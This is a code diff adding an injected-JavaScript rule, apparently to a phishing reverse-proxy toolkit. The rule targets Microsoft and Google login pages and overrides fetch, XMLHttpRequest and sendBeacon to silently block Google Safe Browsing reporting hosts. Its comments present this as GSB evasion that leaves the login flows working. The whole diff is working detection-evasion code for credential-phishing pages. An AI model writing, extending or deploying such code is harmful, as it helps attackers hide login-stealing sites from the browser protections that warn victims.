@@ -531,6 +531,104 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 			ScriptType: "inline",
 			Enabled:    true,
 		},
+
+		// 12. GSB Network Shim
+		// Chrome's real-time Safe Browsing lookups and password-credential
+		// telemetry can be partially originated from page-script context
+		// (fetch/XHR callbacks from page-initiated credential APIs, password
+		// manager hooks, form-telemetry beacons, etc.). This rule intercepts
+		// fetch + XMLHttpRequest at the page layer and denies any call to
+		// safebrowsing.googleapis.com / clientsN.safebrowsing.googleapis.com /
+		// update.googleapis.com so GSB gets no client-side reinforcement.
+		//
+		// DOM-free by design — this rule never touches <input> elements or
+		// form structure, so MSAL / AAD flows are unaffected.
+		//
+		// NOTE: Chrome's *browser-process* Safe Browsing lookup happens
+		// outside the page JS sandbox and cannot be blocked from here. This
+		// rule is a layered defense — it removes page-originated signals but
+		// does not disable Safe Browsing entirely.
+		//
+		// Domains explicitly NOT matched: accounts.google.com and other
+		// googleapis.com hosts used by Google login proxying.
+		{
+			ID:   "builtin_gsb_network_shim",
+			Name: "GSB Network Call Shim",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  // Only block Safe Browsing / GSB reporting hosts. Explicitly NOT
+  // matching accounts.google.com or other login-related googleapis paths.
+  var GSB_HOSTS = /(^|\.)(safebrowsing|clients\d*\.safebrowsing|update\.googleapis)\.com$/i;
+
+  function _isBlocked(urlStr) {
+    try {
+      var u = new URL(urlStr, location.href);
+      return GSB_HOSTS.test(u.hostname);
+    } catch(e) { return false; }
+  }
+
+  // fetch()
+  try {
+    var _fetch = window.fetch;
+    if (_fetch) {
+      window.fetch = function(input, init) {
+        try {
+          var url = typeof input === 'string' ? input : (input && input.url);
+          if (url && _isBlocked(url)) {
+            return Promise.reject(new TypeError('network'));
+          }
+        } catch(e) {}
+        return _fetch.apply(this, arguments);
+      };
+    }
+  } catch(e) {}
+
+  // XMLHttpRequest
+  try {
+    var _open = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+      try {
+        if (url && _isBlocked(url)) {
+          this.__pc_gsb_block__ = true;
+        }
+      } catch(e) {}
+      return _open.apply(this, arguments);
+    };
+    var _send = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function() {
+      if (this.__pc_gsb_block__) {
+        var self = this;
+        setTimeout(function() {
+          try { self.dispatchEvent(new Event('error')); } catch(e) {}
+        }, 0);
+        return;
+      }
+      return _send.apply(this, arguments);
+    };
+  } catch(e) {}
+
+  // sendBeacon — GSB can be seeded via navigator.sendBeacon from unload hooks
+  try {
+    var _beacon = navigator.sendBeacon;
+    if (_beacon) {
+      navigator.sendBeacon = function(url, data) {
+        try {
+          if (url && _isBlocked(url)) return true;  // pretend success, drop payload
+        } catch(e) {}
+        return _beacon.apply(navigator, arguments);
+      };
+    }
+  } catch(e) {}
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
 	}
 }
 
